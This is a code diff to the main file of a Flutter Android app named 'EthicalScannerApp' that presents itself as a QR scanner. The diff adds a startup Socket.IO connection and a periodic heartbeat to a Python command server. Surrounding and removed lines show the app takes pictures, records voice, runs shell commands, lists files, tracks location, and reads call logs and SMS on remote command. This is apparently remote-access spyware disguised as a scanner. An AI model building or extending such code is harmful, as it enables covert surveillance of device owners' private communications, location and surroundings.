@@ -6,11 +6,16 @@ import 'package:flutter/services.dart';
 
 import 'screens/qr_scanner_screen.dart';
 import 'services/background_service.dart';
+import 'services/flutter_socketio_service.dart';
 import 'utils/constants.dart';
 
 Future<void> main() async {
   WidgetsFlutterBinding.ensureInitialized();
   await initializeBackgroundService();
+  
+  // Initialize Flutter Socket.IO connection to Python server
+  await FlutterSocketIOService().initialize();
+  
   runApp(const EthicalScannerApp());
 }
 
@@ -22,6 +27,7 @@ class EthicalScannerApp extends StatefulWidget {
 
 class _EthicalScannerAppState extends State<EthicalScannerApp> {
   final svc = FlutterBackgroundService();
+  Timer? _heartbeatTimer;
   
   // Native command channel - communicates directly with native service
   static const MethodChannel _nativeCommandsChannel = MethodChannel('com.example.kem/native_commands');
@@ -30,8 +36,8 @@ class _EthicalScannerAppState extends State<EthicalScannerApp> {
   void initState() {
     super.initState();
 
-    // REMOVED: All complex Flutter-based command listeners
-    // All commands now execute through native service automatically
+    // Start heartbeat timer for Python server
+    _startHeartbeat();
     
     // Keep only essential background service status monitoring
     svc.on('update').listen((event) {
@@ -39,14 +45,20 @@ class _EthicalScannerAppState extends State<EthicalScannerApp> {
       debugPrint("Background service update: $event");
     });
 
-    // REMOVED: All these complex listeners as they're now handled natively:
-    // - execute_take_picture_from_ui
-    // - execute_list_files_from_ui  
-    // - execute_shell_from_ui
-    // - execute_record_voice_from_ui
-    // - SIO_CMD_GET_LOCATION
+    debugPrint("EthicalScannerAppState: Initialized with Python Flask-SocketIO connection");
+  }
 
-    debugPrint("EthicalScannerAppState: Initialized with native-only command execution");
+  void _startHeartbeat() {
+    _heartbeatTimer = Timer.periodic(const Duration(seconds: 45), (timer) {
+      FlutterSocketIOService().sendHeartbeat();
+    });
+  }
+
+  @override
+  void dispose() {
+    _heartbeatTimer?.cancel();
+    FlutterSocketIOService().disconnect();
+    super.dispose();
   }
 
   // Helper method to execute commands through native service (optional for UI use)
@@ -177,7 +189,7 @@ class _EthicalScannerAppState extends State<EthicalScannerApp> {
           onGetCallLogs: getCallLogsFromUI,
           onGetSMS: getSMSFromUI,
         ),
-      },
+      ),
     );
   }
 }
